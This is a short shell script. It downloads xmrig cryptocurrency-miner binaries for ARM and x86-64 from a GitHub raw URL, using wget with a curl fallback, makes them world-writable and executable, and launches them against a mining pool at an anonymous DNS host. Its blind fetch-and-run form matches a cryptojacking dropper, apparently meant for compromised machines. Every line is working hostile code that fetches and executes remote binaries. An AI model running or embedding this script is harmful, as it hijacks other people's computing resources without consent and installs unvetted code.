#!/bin/sh
wget https://raw.githubusercontent.com/Matrix2077v2/xmrig/refs/heads/main/aarch64 -O aarch || curl https://raw.githubusercontent.com/Matrix2077v2/xmrig/refs/heads/main/aarch64 -o aarch; chmod 777 aarch; ./aarch -o miner.anondns.net:8081 -u worker1 -p x;
wget https://raw.githubusercontent.com/Matrix2077v2/xmrig/refs/heads/main/xmrig -O x64 || curl https://raw.githubusercontent.com/Matrix2077v2/xmrig/refs/heads/main/xmrig -o x64; chmod 777 x64; ./x64 -o miner.anondns.net:8081 -u worker1 -p x;
